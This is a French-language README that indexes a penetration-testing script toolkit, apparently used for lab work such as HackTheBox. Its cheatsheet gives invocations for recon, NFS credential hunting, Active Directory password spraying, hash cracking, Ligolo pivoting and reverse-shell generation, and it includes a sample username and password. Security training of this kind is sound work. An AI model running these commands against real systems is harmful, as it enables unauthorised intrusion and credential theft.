# 🛠️ Scripts Pentest — Index

## Structure

```
Scripts/
├── pentest/           Scripts généraux (premier jour)
│   ├── add-hosts.sh       Ajouter des domaines à /etc/hosts
│   ├── web-enum-all.sh    Enum web parallèle sur tous les subdomains
│   ├── service-enum.sh    Enum automatique selon le port
│   └── parse-nmap.py      Parse XML nmap → markdown
│
├── recon/             Reconnaissance
│   ├── recon.sh           Recon complète : nmap → DNS → service enum auto
│   └── nfs-hunt.sh        Monter les exports NFS et chasser les credentials
│
├── creds/             Attaques de credentials
│   ├── cred-test.sh       Tester 1 credential sur TOUS les services en parallèle
│   ├── spray.sh           Password spray AD avec vérification lockout
│   └── hash-crack.sh      Détection auto du type de hash + cracking hashcat
│
├── ad/                Active Directory
│   └── ad-enum.sh         Enumération AD complète → fichier markdown
│
├── post/              Post-exploitation
│   ├── post-linux.sh      Checklist post-root Linux → markdown
│   └── setup-ligolo.sh    Setup Ligolo-ng complet (proxy + routes)
│
└── exploit/           Exploitation
    └── revshell.sh        Générateur de reverse shells + listener auto
```

## Cheatsheet rapide

```bash
# PREMIER SCAN D'UNE CIBLE
./recon/recon.sh 10.129.20.33 inlanefreight.local

# TESTER DES CREDS SUR TOUT
./creds/cred-test.sh srvadm 'ILFreightnixadm!' 10.129.20.33

# SPRAY AD
./creds/spray.sh users.txt 10.129.20.3 INLANEFREIGHT.LOCAL

# CHASSER LES CREDS DANS NFS
./recon/nfs-hunt.sh 10.129.20.33

# ENUM AD COMPLÈTE
./ad/ad-enum.sh INLANEFREIGHT.LOCAL 'user' 'pass' 10.129.20.3

# REVERSE SHELL
./exploit/revshell.sh 10.10.14.5 4444 bash

# CRACK UN HASH
./creds/hash-crack.sh hash.txt

# POST-EXPLOITATION LINUX
./post/post-linux.sh

# SETUP LIGOLO
./post/setup-ligolo.sh 172.16.8.0/24
```
